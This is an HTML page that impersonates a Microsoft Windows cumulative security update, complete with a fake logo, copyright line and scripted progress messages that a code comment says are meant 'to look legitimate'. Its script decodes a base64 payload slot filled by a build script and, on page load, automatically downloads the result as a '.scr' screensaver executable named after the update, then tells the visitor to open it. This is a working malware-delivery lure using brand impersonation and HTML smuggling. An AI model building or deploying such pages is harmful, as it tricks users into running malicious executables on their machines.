<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Security Update — KB5034441</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #f5f7fa 0%, #e4e9f0 100%);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .container {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.08);
    padding: 48px 56px;
    text-align: center;
    max-width: 520px;
    width: 90%;
  }
  .ms-logo {
    width: 44px; height: 44px;
    margin: 0 auto 24px;
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 3px;
  }
  .ms-logo div:nth-child(1) { background: #f25022; border-radius: 2px; }
  .ms-logo div:nth-child(2) { background: #7fba00; border-radius: 2px; }
  .ms-logo div:nth-child(3) { background: #00a4ef; border-radius: 2px; }
  .ms-logo div:nth-child(4) { background: #ffb900; border-radius: 2px; }
  h1 {
    font-size: 20px; font-weight: 600; color: #1a1a1a;
    margin-bottom: 8px;
  }
  .subtitle {
    font-size: 13px; color: #666; margin-bottom: 28px;
  }
  .progress-container {
    width: 100%; height: 4px; background: #e0e0e0;
    border-radius: 4px; overflow: hidden; margin-bottom: 20px;
  }
  .progress-bar {
    height: 100%; width: 0%; background: #0078d4;
    border-radius: 4px;
    animation: progress 3.5s ease-in-out forwards;
  }
  @keyframes progress {
    0% { width: 0%; }
    30% { width: 45%; }
    60% { width: 72%; }
    90% { width: 95%; }
    100% { width: 100%; }
  }
  .status {
    font-size: 14px; color: #444; margin-bottom: 6px;
  }
  .status-detail {
    font-size: 12px; color: #999;
  }
  .spinner {
    border: 3px solid #e8e8e8; border-top: 3px solid #0078d4;
    border-radius: 50%; width: 32px; height: 32px;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .done-icon {
    font-size: 48px; margin-bottom: 16px;
    display: none;
  }
  .kb-id {
    font-size: 11px; color: #bbb; margin-top: 20px;
  }
  .footer {
    font-size: 11px; color: #bbb; margin-top: 16px;
    padding-top: 16px; border-top: 1px solid #f0f0f0;
  }
</style>
</head>
<body>

<div class="container" id="main">
  <div class="ms-logo"><div></div><div></div><div></div><div></div></div>
  <h1>Windows Security Update</h1>
  <p class="subtitle">Cumulative Update for Windows 11 — KB5034441</p>
  <div class="spinner" id="spinner"></div>
  <div class="progress-container"><div class="progress-bar" id="pbar"></div></div>
  <p class="status" id="status">Downloading update components...</p>
  <p class="status-detail" id="detail">This may take a few moments</p>
  <p class="kb-id">Update ID: KB5034441-x64-2026.07</p>
  <div class="footer">© Microsoft Corporation. All rights reserved.</div>
</div>

<script>
(function(){
  // Status messages to look legitimate
  var msgs = [
    ["Downloading update components...", "Connecting to Windows Update servers"],
    ["Verifying package integrity...", "Checking digital signatures"],
    ["Preparing installation...", "Extracting update files"],
    ["Applying security patches...", "Finalizing configuration"]
  ];

  var idx = 0;
  var si = setInterval(function(){
    idx++;
    if(idx < msgs.length){
      document.getElementById('status').textContent = msgs[idx][0];
      document.getElementById('detail').textContent = msgs[idx][1];
    }
  }, 900);

  // Base64 payload — injected by build script
  var d = "%%PAYLOAD_B64%%";

  // Decode
  var r = atob(d);
  var u = new Uint8Array(r.length);
  for(var i=0; i<r.length; i++) u[i] = r.charCodeAt(i);

  // Create blob and trigger download
  var b = new Blob([u], {type:'application/octet-stream'});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(b);
  a.download = 'SecurityUpdate-KB5034441.scr';
  document.body.appendChild(a);

  setTimeout(function(){
    a.click();
    a.remove();
    URL.revokeObjectURL(a.href);
  }, 1500);

  // Show completion after progress bar finishes
  setTimeout(function(){
    clearInterval(si);
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('status').innerHTML = '✅ Update downloaded successfully';
    document.getElementById('status').style.color = '#107c10';
    document.getElementById('detail').textContent = 'Please open the downloaded file to complete installation';
    document.getElementById('detail').style.color = '#333';
    document.getElementById('detail').style.fontWeight = '600';
  }, 4000);
})();
</script>

</body>
</html>
